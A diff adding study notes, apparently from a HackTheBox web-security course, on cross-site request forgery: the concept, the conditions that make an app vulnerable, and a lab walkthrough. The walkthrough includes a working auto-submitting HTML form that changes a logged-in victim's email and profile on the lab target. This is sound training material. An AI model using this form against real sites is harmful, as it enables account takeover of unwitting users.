@@ -370,3 +370,61 @@ an example of this can be:
 
 remember that in these attacks even if the app was using SSL encryption the attacker would still be able to capture the cookies because they are client-side 
 
+## Cross-Site Request Forgery (CSRF or XSRF) 
+
+CSRF is forcing an end-user to execute inadvertent actions on a web app they are authenticated to   
+usually mounted with the help of attacker crafted web apps that the user must visit or interact with   
+these pages contain malicious requests that inherit the identify and privileges of the victim to perform an undesired function on the victim's behalf   
+CSRF attacks generally target functions that cause a state change on the server but can also be used for info disclosure 
+
+during CSRF, the attacker doesn't need to read the server's response to the malicious cross-site request   
+the Same-Origin policy, which restricts how a document or script loaded by one origin can interact with a resource, will not prevent this because the same-origin policy will prevent the attacker from reading the server's response but in a CSRF the attacker doesn't have to 
+
+a web app is vulnerable to CSRF when: 
+- all parameters required for the targeted request can be determined or guessed by the attacker 
+- app session management is solely based on HTTP cookies which are auto included in browser requests 
+
+to successfully exploit a CSRF we need: 
+- to craft a malicious web page that will issue a valid request impersonating the victim 
+- the victim to be logged into the app at the same time when the cross-site request is issued 
+
+### Cross-site request forgery example 
+
+in our target if we capture the save request call in burp: 
+
+![](Images/Pasted%20image%2020240305132840.png)
+
+![](Images/Pasted%20image%2020240305132859.png)
+
+in this request we don't see any type of anti-csrf token 
+
+lets now try to execute a CSRF attack against our account that will change her profile details by visiting another site while logged in to the target app 
+
+first we make an HTML page that will be our malicious site: 
+
+```html
+<html>
+  <body>
+    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
+      <input type="hidden" name="email" value="attacker@htb.net" />
+      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
+      <input type="hidden" name="country" value="CSRF_POC" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.getElementById("submitMe").submit()
+    </script>
+  </body>
+</html>
+```
+
+then we host this page with a simple python server using `python -m http.server 1337`    
+
+then for the victim behavior we make sure we are still logged in and visit the page we are hosting: `http://<VPN/TUN Adapter IP>:1337/notmalicious.html`
+
+we can see that after visiting the site we can see the logic of changing the profile details gets executed: 
+
+![](Images/Pasted%20image%2020240305133756.png)
+
+remember that this attack will also work with GET based requests 
+
